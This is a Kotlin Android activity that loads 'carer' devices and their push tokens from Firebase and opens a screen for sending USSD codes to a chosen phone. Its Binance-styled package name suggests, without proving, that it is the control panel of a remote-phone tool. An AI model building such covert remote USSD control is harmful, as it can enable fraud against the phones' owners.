package dApp.binance.Trading.controller

import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener

class MainActivity : AppCompatActivity() {

    private lateinit var deviceList: RecyclerView
    private lateinit var addDeviceButton: Button
    private val devices = mutableListOf<Device>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        deviceList = findViewById(R.id.deviceList)
        addDeviceButton = findViewById(R.id.addDeviceButton)

        deviceList.layoutManager = LinearLayoutManager(this)
        
        addDeviceButton.setOnClickListener {
            startActivity(Intent(this, AddDeviceActivity::class.java))
        }

        loadDevices()
    }

    override fun onResume() {
        super.onResume()
        loadDevices()
    }

    private fun loadDevices() {
        val database = FirebaseDatabase.getInstance().reference
        database.child("devices").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                devices.clear()
                snapshot.children.forEach { child ->
                    val deviceData = child.value as? Map<*, *>
                    if (deviceData != null && deviceData["app_type"] == "carer") {
                        devices.add(Device(
                            id = child.key ?: "",
                            name = deviceData["device_id"] as? String ?: "Unknown",
                            status = deviceData["status"] as? String ?: "offline",
                            fcmToken = deviceData["fcm_token"] as? String ?: ""
                        ))
                    }
                }

                deviceList.adapter = DeviceAdapter(devices) { device ->
                    val intent = Intent(this@MainActivity, SendUssdActivity::class.java)
                    intent.putExtra("device_id", device.id)
                    intent.putExtra("device_name", device.name)
                    intent.putExtra("fcm_token", device.fcmToken)
                    startActivity(intent)
                }
            }

            override fun onCancelled(error: DatabaseError) {
                // Handle error
            }
        })
    }
}

data class Device(
    val id: String,
    val name: String,
    val status: String,
    val fcmToken: String
)
